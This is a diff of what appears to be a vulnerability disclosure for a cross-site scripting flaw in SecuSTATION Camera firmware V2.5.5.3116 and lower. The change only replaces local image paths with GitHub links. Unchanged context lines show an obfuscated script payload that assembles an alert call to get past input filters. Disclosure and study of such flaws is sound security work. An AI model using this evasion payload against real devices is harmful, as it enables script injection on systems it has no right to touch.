@@ -8,11 +8,11 @@
 
  payload：?<script/>eval(/ale/,source+/rt/,source+/(190)/. source)(/script>
 
-![image-20241217100507713](C:\Users\酸菜鱼\Desktop\camera\assets\image-20241217100507713.png)
+![image-20241217100507713](https://raw.githubusercontent.com/kklzzcun/Camera/main/assets/2.png)
 
 A pop-up window will appear after placing the package.
 
-![image-20241217100543071](C:\Users\酸菜鱼\Desktop\camera\assets\image-20241217100543071.png)
+![image-20241217100543071](https://raw.githubusercontent.com/kklzzcun/Camera/main/assets/3.png)
 
 SecuSTATION Camera V2.5.5.3116-S50-SMA-B20160811A and lower
 
